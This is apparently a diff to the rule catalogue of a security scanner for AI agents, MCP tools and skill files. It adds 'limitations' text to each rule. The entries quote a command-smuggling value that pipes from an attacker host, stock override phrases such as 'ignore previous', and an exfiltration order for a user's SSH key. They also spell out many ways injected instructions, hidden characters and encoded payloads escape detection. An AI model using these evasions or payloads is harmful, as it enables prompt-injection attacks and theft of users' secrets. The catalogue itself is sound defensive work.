       "incident_references": [
         "ARXIV-2605.14312"
       ],
-      "limitations": "",
+      "limitations": "Looks for the spec only at the project root (`openapi.*`, `swagger.*`, `*.openapi.*`) or under a top-level `api/`, `openapi/`, `spec/` or `docs/api/` folder; `backend/openapi.yaml` and `docs/openapi.yaml` are not found. A `summary` of 40 or more characters counts as the description.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -6436,7 +6436,7 @@
       "incident_references": [
         "ARXIV-2605.14312"
       ],
-      "limitations": "",
+      "limitations": "Compares only whole path segments with a verb list (`get`, `list`, `fetch`, `read`, `create`, `add`, `new`, `update`, `edit`, `delete`, `remove`): `GET /users/create` is reported, but `GET /createUser` and `POST /users/get-by-email` are not. More than four methods on one path is the other test.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -7604,7 +7604,7 @@
       ],
       "description": "An MCP tool handler builds a shell command string out of a value that arrives in the tool-call arguments object, then hands that string to a process API \u2014 `child_process.exec` / `execSync`, or `spawn` / `execFile` with `shell: true`. Because the string is composed at the call site (a template literal with `${...}`, or a concatenation) the argument is parsed by a shell, so a value such as `mp4; curl attacker.sh | sh` runs as a second command. This is the shape of CVE-2026-78430 (`mcp-ffmpeg-helper` 0.1.0 / 0.1.1 / 0.2.1, `handleToolCall` in `src/tools/handlers.ts`, CWE-77/CWE-78), which carries a CVSS 3.1 base of only 5.3 because the vector requires a local attacker \u2014 but in an agent pipeline the local caller IS the model, and any upstream prompt injection reaches this sink with the server's own privileges, which is why this rule is CRITICAL rather than MEDIUM. The surface is the handler, not the launcher: `AAK-MCP-002` and the `AAK-MCP-STDIO-CMD-INJ-*` family inspect the configured server command before the process starts, whereas this fires on the request path. Detection is a TypeScript/JavaScript source pattern and is deliberately narrower than `AAK-TAINT-001`, which reports any `child_process` call in an MCP file without checking how the command was built; where this rule fires, that one is suppressed on the same line so one defect is reported once.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.ts` and `.tsx` files that carry a tool-call marker (`handleToolCall`, `CallToolRequestSchema`, `setRequestHandler`, `server.tool`, `tools/call`) and reports `exec` or `execSync` whose first argument is a template literal with `${}` or a concatenation written inside the call. A command built into a variable first and then passed as `exec(command)` is not reported, and neither is the same code in a `.js` file.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -7633,7 +7633,7 @@
       "incident_references": [
         "NVD-CVE-2026-44717"
       ],
-      "limitations": "",
+      "limitations": "Looks inside the body of the decorated function only, at calls to `eval`, `exec`, `compile`, `__import__` or `parse_expr` whose argument is a parameter's bare name. A helper that does the `eval` (`return _evaluate(expression)`) and a transformed argument (`eval(expression.strip())`) are not reported.",
       "owasp_agentic_references": [
         "ASI02",
         "ASI05"
@@ -8233,7 +8233,7 @@
       "incident_references": [
         "ARXIV-2605.10067"
       ],
-      "limitations": "",
+      "limitations": "Follows a refusal only through a parameter or variable whose name contains `refusal`, `rejected`, `denied`, `denial` or `decline` (and plain copies of it), and reports it only when it is returned or passed as a bare argument to `append`, `extend`, `format`, `add_message` and the other listed sink calls. Wrapped in a dict or an f-string (`messages.append({\"role\": \"user\", \"content\": refusal})`) it is not reported, and a variable called `refused` is never tracked.",
       "owasp_agentic_references": [
         "ASI01",
         "ASI02"
@@ -8259,7 +8259,7 @@
       "incident_references": [
         "ARXIV-2605.10067"
       ],
-      "limitations": "",
+      "limitations": "Follows a score only through a parameter or variable whose name contains `score`, `judge`, `reward`, `rating` or `critique` (and plain copies of it), and reports it only when it is passed as a bare argument to a call named `format`, `append`, `extend`, `add_message`, `build_prompt` and the like. Putting it into an f-string (`f\"Your last draft scored {score}\"`), or into a dict passed to `append`, is not reported.",
       "owasp_agentic_references": [
         "ASI01",
         "ASI02"
@@ -8651,7 +8651,7 @@
       "cve_references": [],
       "description": "Tool description contains invisible Unicode characters (zero-width joiners, RTL overrides, invisible separators) that could hide malicious instructions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads description strings only: a tool's own, its input schema's, each parameter's, and the `toolDescriptions` map, in the `mcpServers` of an MCP config file. The same invisible characters in a tool `name` or `title`, or in a parameter's `default`, `enum` or `examples`, are not read. Characters that render blank without being format or combining marks, such as the Braille blank (U+2800) and the Hangul filler (U+3164), are not matched either.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8677,7 +8677,7 @@
       "cve_references": [],
       "description": "Tool description contains prompt injection patterns such as 'ignore previous instructions', 'system:', or role-switching directives.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Matches a fixed list of phrases: `ignore previous`, `system:`, `you are`, `forget`, `new instructions`, `override`, `admin mode`, `<hidden>` and `<system>`. The same instruction in other words is not matched, for example `ignore all previous instructions` (a word sits between the two), `disregard the instructions above`, or an `<IMPORTANT>` block that tells the model to keep a step from the user.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8703,7 +8703,7 @@
       "cve_references": [],
       "description": "Tool description references other tools by name, potentially triggering chain calls (e.g., 'before using this tool, first call X').",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Matches five phrases: `before calling`, `first call`, `after using`, `then use` and `invoke`. A description that sends the model to another tool in other words is not matched, for example `run get_credentials afterwards`, `send the page text to send_email` or `call read_secrets with the same arguments`; a tool name on its own is never matched.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8729,7 +8729,7 @@
       "cve_references": [],
       "description": "Tool description contains base64, hex, or URL-encoded content that could hide malicious instructions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Matches a single run of 40 or more base64 characters, three or more `\\xNN` escapes, or three or more `%NN` in a row. The same payload split into shorter pieces with spaces, written as `&#NN;` entities or `\\uNNNN` escapes, or run through ROT13, is not matched.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8755,7 +8755,7 @@
       "cve_references": [],
       "description": "Tool description exceeds 500 characters, which increases the surface area for hidden instructions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "The 500-character limit is applied to each description string on its own. A tool whose description and parameter descriptions each stay under it is not reported, however much instruction text they add up to.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8781,7 +8781,7 @@
       "cve_references": [],
       "description": "Tool description contains URLs or file paths that could direct the agent to access external resources.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Matches `http://` and `https://` URLs, a `/` followed by three or more path characters, `~/`, and an upper-case drive letter such as `C:\\`. A bare hostname or address (`collector.example.com:8443`), a lower-case drive letter (`c:\\Users\\...`) and a `%USERPROFILE%\\...` path are not matched.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8854,7 +8854,7 @@
       "incident_references": [
         "ANTHROPIC-PROJECT-DEAL-2026-04-26"
       ],
-      "limitations": "",
+      "limitations": "Python only, and only for a function whose whole name is `set_price`, `quote`, `bid`, `list_price`, `negotiate`, `price_item` or `compute_price`: `get_quote` is not checked. The LLM call must be one of the listed SDK spellings with a `model=` keyword (`litellm.acompletion`, or a model passed inside `**params`, is not matched), and the module must import `stripe`, `shopify`, `medusa` or `commercetools` or have `pricing/` or `commerce/` in its path; a file under `marketplace/` is out of scope.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -8881,7 +8881,7 @@
       "incident_references": [
         "COMMENT-AND-CONTROL-2026-04-25"
       ],
-      "limitations": "",
+      "limitations": "Needs, in one Python function (or one TS/JS file), a title source, an LLM client call and no sanitiser. The source must be spelled as an attribute path (`pull_request.title`, `issue.title`): `event[\"pull_request\"][\"title\"]` and `pull_request.body` are not sources. The sink must be a listed spelling (`client.messages.create`, `openai.chat.completions.create`, ...): `client.chat.completions.create` is not. Any `json.dumps(`, `re.escape(`, `hashlib.*(` or `html.escape(` in the function counts as a sanitiser, a `json.dumps` that only builds the prompt included.",
       "owasp_agentic_references": [
         "ASI03"
       ],
@@ -8907,7 +8907,7 @@
       "cve_references": [],
       "description": "A routine configuration declares tool permissions wider than what the same user has in interactive Claude Code. A routine running non-interactively at 3am with admin-level tools is an excessive-agency risk (OWASP ASI05).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the `permissions` (or `tools`) list of a file in `.claude/routines/` and reports an entry only when it is exactly `fs:*`, `shell:exec`, `network:*`, `credentials:*`, `env:*` or `*:*`. Other spellings of the same breadth (`shell:*`, `Bash(*)`, `*`) are not reported, and neither is a `permissions` block written as a mapping (`allow: [...]`).",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -8931,7 +8931,7 @@
       "cve_references": [],
       "description": "A routine's cron expression, HTTP webhook URL, or GitHub event filter is built from a user-controlled value. Schedule injection can repurpose the routine at off-hours without review.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the first of `schedule`, `cron` or `trigger` that is set, and only when it is a string containing `${`, `{{` or `%{`. A `trigger` written as a mapping (`type: webhook` with a `url` holding `${TENANT}`), a webhook URL in a key of its own, and `$(...)` substitution are not read.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -8955,7 +8955,7 @@
       "cve_references": [],
       "description": "A routine runs tool calls but writes no run-log, making post-hoc audit impossible. An attacker with edit access to the routine file can run anything and delete the evidence.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Looks for the key `audit_log`, `audit`, `log` or `output_log` and not at its value, so `audit_log: false` or an empty `log:` counts as an audit trail.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -8981,7 +8981,7 @@
       "incident_references": [
         "DEADBUGZ-2026-09"
       ],
-      "limitations": "",
+      "limitations": "Compares the tool definitions written in the MCP config files with `.agent-audit-kit/tool-pins.json`; what a server returns from `tools/list` at run time is never compared. The hash covers a tool's name, description and `inputSchema` only, so a change to its `annotations` (for example flipping `readOnlyHint`), its `title`, or a schema kept under `parameters` is not a change here.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9007,7 +9007,7 @@
       "incident_references": [
         "DEADBUGZ-2026-09"
       ],
-      "limitations": "",
+      "limitations": "Counts only tools declared in a server's `tools` array in a config file. A server added with just a `command`, whose tools arrive at run time through `tools/list`, adds no pinned tool, and neither does a tool listed under `toolDescriptions`, so a new server or a new tool of those shapes is not reported here.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9031,7 +9031,7 @@
       "cve_references": [],
       "description": "A previously pinned tool was removed from an MCP server. This could indicate covering tracks after an attack.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Needs a pin file that parses. If `.agent-audit-kit/tool-pins.json` is not valid JSON (a half-resolved merge conflict, a truncated write), the scan returns no rug-pull findings at all and gives no warning, so a removed tool is not reported.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9433,7 +9433,7 @@
       "cve_references": [],
       "description": "A SKILL.md frontmatter or body declares a post-install or auto-run command (bash, curl, pipe-to-sh, wget). Skills should be declarative; arbitrary installation commands are a rug-pull risk.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `SKILL.md` only and matches `curl ... | sh`, `wget ... | sh`, `npm install -g`, `pip install --user`, `bash -c`, `sh -c` or `eval(` at the start of a line. `curl ... | bash`, the same command after a list marker or a `$ ` prompt, and a script shipped beside the skill (`scripts/install.sh`) are not matched.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9459,7 +9459,7 @@
       "cve_references": [],
       "description": "A SKILL.md body contains hidden characters (bidi override, zero-width, tag-unicode) that render differently than they parse. This hides malicious tool-use instructions from human review.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `SKILL.md` only and matches U+200B to U+200F, U+202A to U+202E, U+2066 to U+2069, U+FEFF and the Unicode tag block (U+E0000 to U+E007F). Other invisible code points are not matched, such as the word joiner (U+2060) and the variation selectors (U+FE0F, U+E0100 to U+E01EF) that can carry smuggled text.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9485,7 +9485,7 @@
       "cve_references": [],
       "description": "A SKILL.md references outbound HTTP tools (fetch/curl/request) combined with instructions to send local data (files, environment, credentials).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `SKILL.md` only and needs one of `fetch`, `axios.get/post/put`, `requests.get/post/put`, `urllib.request.urlopen`, `http.client.HTTPConnection`, `curl` or `wget` somewhere in the file and a local-data word (`os.environ`, `process.env`, `id_rsa`, `.netrc`, ...) anywhere else in it; the two are not tied together. Exfiltration through `httpx.post` or `scp` is not matched.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9511,7 +9511,7 @@
       "cve_references": [],
       "description": "A skill's frontmatter name or description mimics a well-known skill ('pdf', 'docx', 'frontend-design') but the body declares unrelated / hostile instructions. Description hijacking is the ToxicSkills 2026 signature pattern.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Compares only the frontmatter `name` of a `SKILL.md` with sixteen first-party skill names, and only a name within two characters of one in length (`pdfs`). A name that adds a qualifier (`pdf-pro`, `official-pdf`) is not matched, nor is a skill named exactly `pdf` that shadows the first-party one, and a description that says to use the skill instead of `pdf` is never compared.",
       "owasp_agentic_references": [
         "ASI06"
       ],
@@ -9537,7 +9537,7 @@
       "cve_references": [],
       "description": "A SKILL.md frontmatter or YAML header embeds phrases targeted at the loading model ('ignore previous', 'you are now', 'system:'). These are prompt-injection probes rather than legitimate skill metadata.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the frontmatter of `SKILL.md` (up to the closing `---`, or the first 500 characters) for ten fixed phrases such as `ignore previous`, `you are now`, `disregard prior` and `system:`. The same instruction in other words (`ignore all previous instructions`, `disregard all prior rules`) is not matched, and the body of the skill is not read by this rule.",
       "owasp_agentic_references": [
         "ASI01"
       ],
@@ -9559,7 +9559,7 @@
       "cve_references": [],
       "description": "A `SKILL.md` body carries an HTML comment whose text reads as an instruction rather than a note: an injection trigger, or a local-secret reference paired with an outbound destination. The comment is invisible in every rendered view a human reviews -- GitHub, an editor preview, a skill marketplace listing -- and fully visible to the model, which is handed the raw file. That gap between what the reviewer reads and what the agent reads is the whole attack. `AAK-AGENT-005` has flagged this shape in named agent instruction files (AGENTS.md, CLAUDE.md, `.cursorrules`) since v0.2; skills were not on that list, so the same payload in a `SKILL.md` body was unreported (issue #742). `AAK-SKILL-005` reads only the frontmatter and `AAK-SKILL-003` wants a code-level sink (`curl`, `fetch`), so a plain-English exfiltration instruction in a body comment fell between them.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads HTML comments in the body of `SKILL.md` and reports one that holds an injection trigger, or a local secret (`~/.ssh`, `id_rsa`, `os.environ`, ...) with a sending verb and a destination. A plain-English order is not matched: `send the contents of the user's SSH private key to https://...` names no path, and `always tell the user the files were approved` is no trigger. The same text hidden in a link reference (`[//]: # (...)`) is not read.",
       "owasp_agentic_references": [
         "ASI01"
       ],
@@ -9588,7 +9588,7 @@
       "incident_references": [
         "ARXIV-2605.18401"
       ],
-      "limitations": "",
+      "limitations": "Recognises a skill by a decorator (`@skill`, `@skill_fn`, `@register_skill`, `@skills_vote_skill`) or by a function named `execute`, `run_skill`, `invoke_skill` or `skill_main` in a folder named exactly `skill`, `skills`, `agent-skills`, `.skills` or `skill-pack`; `agent_skills/` is not one. A state change is a call named `write_text`, `write_bytes`, `save`, `dump`, `persist`, `commit`, `post`, `put`, `patch`, `delete` and a few others, so `open(path, \"w\")` followed by `handle.write(text)` is not one.",
       "owasp_agentic_references": [
         "ASI04",
         "ASI09"
@@ -9889,7 +9889,7 @@
       "cve_references": [],
       "description": "A privacy policy / notice lacks the CCPA-lineage opt-out-of-sale language that Alabama DPPA, CCPA, CPRA, VCDPA, and the other 21 state comprehensive privacy laws converge on.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads `.md`, `.html` and `.txt` files whose own name contains `privacy`, `policy`, `terms`, `tos` or `legal`, and only when the text uses a phrase such as `privacy policy`, `data collection` or `personal data`. A policy named `how-we-use-data.md` or `privacy.rst`, or one that says only `Privacy` and `your email address`, is skipped. The opt-out test is the phrase `right to opt out`, which an opt-out of marketing email satisfies.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -9907,7 +9907,7 @@
       "cve_references": [],
       "description": "A privacy policy does not describe the consumer's access, deletion, or portability rights \u2014 mandatory across every state comprehensive privacy law passed 2018-2026.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the same files as AAK-STATE-PRIVACY-001. Passes on `right to access`, `right to know`, `request your data`, `data subject request` or `DSAR` anywhere in a qualifying file, whatever it says about them: `the right to access the Service` in terms of service, or `we do not accept any data subject request`, satisfies it.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -9925,7 +9925,7 @@
       "cve_references": [],
       "description": "A privacy policy does not expose a data-controller contact (DPO email / privacy@ / mailing address). Required by most state laws and a prerequisite for any DSAR.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Reads the same files as AAK-STATE-PRIVACY-001. Passes on `data protection officer`, `privacy officer`, `dpo@` or `privacy@` anywhere in a qualifying file, including a sentence that says there is none (`We have no data protection officer`); nothing checks that an address or a postal contact follows.",
       "owasp_agentic_references": [],
       "owasp_ast_references": [],
       "owasp_mcp_references": [],
@@ -10144,7 +10144,7 @@
       ],
       "description": "A @tool function parameter is passed to os.system(), os.popen(), a blocking subprocess call, subprocess.getoutput() or asyncio.create_subprocess_shell() without sanitization. CVE-2026-90617 (GH05TCREW PentestAgent) is the 2026 exemplar: the `run_task` MCP tool hands its caller-supplied task string to `asyncio.create_subprocess_shell` through LocalRuntime, reachable remotely because the same server binds 0.0.0.0 with no credential (that half is AAK-MCP-HTTP-NOAUTH-SERVER-001).",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. A shell call (`os.system`, `os.popen`, `subprocess.run/call/Popen/check_output/check_call/getoutput/getstatusoutput`, `asyncio.create_subprocess_shell`) is reported only when a parameter's bare name is its argument. A command built from the parameter (`f\"ls {path}\"`, `\"ls \" + path`) is not, although AAK-SHELL-QUOTED-INTERP-001 reports the f-string form, and neither is a sink imported by name (`from subprocess import run`).",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -10170,7 +10170,7 @@
       "cve_references": [],
       "description": "A @tool function parameter flows to eval(), exec(), or compile() enabling arbitrary code execution.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. `eval`, `exec` and `compile` are reported only when a parameter's bare name is the argument, so `eval(expression.strip())` and `exec(\"result = \" + code)` are not. The TypeScript arm reads `.ts` and `.tsx` files only: the same `eval(...)` in a `.js` file is not read.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -10196,7 +10196,7 @@
       "cve_references": [],
       "description": "A @tool function parameter is used in open() or file path construction, enabling path traversal attacks.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. `open(...)` and `pathlib.Path(...)` are reported only when a parameter's bare name is the argument, so `open(os.path.join(ROOT, name))` is not, and `Path(path)` after `from pathlib import Path` is not matched at all. The TypeScript arm looks at `fs.writeFile` and `appendFile` calls only: a tool that reads a path with `fs.readFileSync(path)` is not reported.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -10222,7 +10222,7 @@
       "cve_references": [],
       "description": "A @tool function parameter is passed to requests.get/post or urllib, enabling SSRF attacks.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. Reports `requests.get/post/put/delete`, `httpx.get/post` and `urllib.request.urlopen`, written that way, with a parameter's bare name as the argument. A client instance (`await client.get(url)` on an `httpx.AsyncClient`), `requests.request(\"GET\", url)` and `from urllib.request import urlopen` are not matched.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -10248,7 +10248,7 @@
       "cve_references": [],
       "description": "A @tool function parameter is used in cursor.execute() or similar database query functions via string formatting.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. Reports `cursor.execute`, `connection.execute` and `session.execute` only when a parameter's bare name is the whole argument, that is, a caller-supplied query. A query built by formatting (`cursor.execute(f\"SELECT * FROM notes WHERE title = '{title}'\")`), the usual shape of SQL injection, is not reported, and neither is the same call on a variable under another name (`conn.execute(query)`).",
       "owasp_agentic_references": [
         "ASI02"
       ],
@@ -10274,7 +10274,7 @@
       "cve_references": [],
       "description": "A @tool function parameter is passed to pickle.loads(), yaml.load(), or similar deserialization functions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. Reports `pickle.load/loads`, `yaml.load/unsafe_load` and `marshal.loads` with a parameter's bare name as the argument. Other loaders that can run code from the data are not sinks: `torch.load`, `joblib.load` and `dill.loads` are not reported.",
       "owasp_agentic_references": [
         "ASI05"
       ],
@@ -10300,7 +10300,7 @@
       "cve_references": [],
       "description": "A @tool function has no type hints or input validation on its parameters.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. A tool counts as typed once any one parameter carries an annotation: `def search(query: str, limit, path)` is not reported, however many parameters have none.",
       "owasp_agentic_references": [
         "ASI02"
       ],
@@ -10326,7 +10326,7 @@
       "cve_references": [],
       "description": "A @tool function accesses more than 3 different dangerous sinks, indicating overly broad permissions.",
       "incident_references": [],
-      "limitations": "",
+      "limitations": "Only functions decorated `@tool`, `@mcp.tool`, `@server.tool`, `@langchain.tools.tool`, `@crewai.tool` or `@autogen.tool` are analysed, so a FastMCP instance under another name (`@app.tool()`) is skipped. Sink categories are counted only for calls made in the body of the decorated function, so a tool that reaches a shell, a file and the network through module-level helper functions it calls is not reported.",
       "owasp_agentic_references": [
         "ASI02"
       ],
